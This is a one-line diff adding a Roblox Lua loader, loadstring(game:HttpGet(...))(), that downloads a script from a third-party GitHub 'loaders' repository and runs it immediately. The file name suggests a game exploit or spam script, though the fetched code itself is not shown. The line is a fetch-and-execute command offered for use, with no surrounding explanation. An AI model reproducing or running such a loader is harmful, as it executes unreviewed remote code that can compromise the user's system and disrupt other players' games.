@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/a-long-flight-sandbox-spam6-5qcnahu1ocwko7.lua"))()
